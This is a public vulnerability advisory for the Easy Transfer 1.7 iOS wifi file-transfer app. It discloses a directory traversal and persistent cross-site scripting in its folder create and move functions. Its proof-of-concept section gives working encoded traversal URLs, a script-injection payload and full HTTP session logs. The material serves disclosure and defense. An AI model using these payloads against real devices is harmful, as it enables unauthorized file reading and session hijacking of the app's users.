@@ -1,0 +1,187 @@
+# Title: Easy Transfer 1.7 for iOS - Directory Traversal
+# Author: Vulnerability Laboratory
+# Date: 2020-04-27
+# Software: https://apps.apple.com/us/app/easy-transfer-wifi-transfer/id1484667078
+# CVE: N/A
+
+Document Title:
+===============
+Easy Transfer v1.7 iOS - Multiple Web Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2223
+
+
+Common Vulnerability Scoring System:
+====================================
+7.1
+
+
+Affected Product(s):
+====================
+Rubikon Teknoloji
+Product: Easy Transfer v1.7 - iOS Mobile Web-Application
+(Copy of the Homepage:
+https://apps.apple.com/us/app/easy-transfer-wifi-transfer/id1484667078 )
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-27: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+1.1
+A directory traversal web vulnerability has been discovered in the Easy
+Transfer Wifi Transfer v1.7 ios mobile application.
+The vulnerability allows remote attackers to change the application path
+in performed requests to compromise the local application
+or file-system of a mobile device. Attackers are for example able to
+request environment variables or a sensitive system path.
+
+The directory-traversal web vulnerability is located in the main
+application path request performed via GET method. Attackers are
+able to request for example the local path variables of the web-server
+by changing the local path in the performed request itself.
+In a first request the attack changes the path, the host redirects to
+complete the adress with "..". Then the attacker just
+attaches /.. a final slash to its request and the path can be accessed
+via web-browser to download or list local files.
+
+Exploitation of the directory traversal web vulnerability requires no
+privileged web-application user account or user interaction.
+Successful exploitation of the vulnerability results in information
+leaking by unauthorized file access and mobile application compromise.
+
+
+1.2
+Multiple persistent cross site scripting vulnerability has been
+discovered in the Easy Transfer Wifi Transfer v1.7 ios mobile application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise the mobile
+web-application from the application-side.
+
+The persistent vulnerabilities are located in the `Create Folder` and
+`Move/Edit` functions. Attackers are able to inject own malicious
+script codes to the `oldPath`, `newPath` and `path` parameters. The
+request method to inject is POST and the attack vector is located on
+the application-side.
+
+Successful exploitation of the vulnerability results in session
+hijacking, persistent phishing attacks, persistent external redirects
+to malicious source and persistent manipulation of affected application
+modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Create Folder
+[+] Move/Edit
+
+Vulnerable Parameter(s):
+[+] oldPath
+[+] newPath
+[+] path
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The directory traversal web vulnerability can be exploited by remote
+attackers with wifi network access without user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+PoC: Exploitation
+http://localhost/list?path=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../
+
+[{"path":"/../../../../../../../../../../../../../../../../../../../../../../../../../../../test/","name":"test"}]
+
+
+--- PoC Session Logs [GET] --- (list)
+http://localhost/list?path=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../
+Host: localhost
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+-
+GET: HTTP/1.1 200 OK
+Content-Length: 213
+Content-Type: application/json
+Connection: Close
+
+
+1.2
+The persistent input validation web vulnerabilities can be exploited by
+remote attackers with wifi network access with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+PoC: Exploitation
+<scriptx00>alert(document.domain)</script>
+
+
+--- PoC Session Logs [POST] --- (Create & Move)
+http://localhost/create
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 47
+Origin: http://localhost
+Connection: keep-alive
+Referer: http://localhost/
+path=/test<scriptx00>alert(document.domain)</script>
+-
+POST: HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Length: 2
+Content-Type: application/json
+Connection: Close
+-
+http://localhost/move
+Host: localhost
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 69
+Origin: http://localhost
+Connection: keep-alive
+Referer: http://localhost/
+oldPath=/test/<scriptx00>alert(document.domain)</script>&newPath=/test<scriptx00>alert(document.domain)</script>
+-
+POST: HTTP/1.1 200 OK
+Content-Length: 411
+Content-Type: text/html; charset=utf-8
+Connection: Close
+- [GET] (Execution)
+http://localhost/evil.source
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+Referer: http://localhost/
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
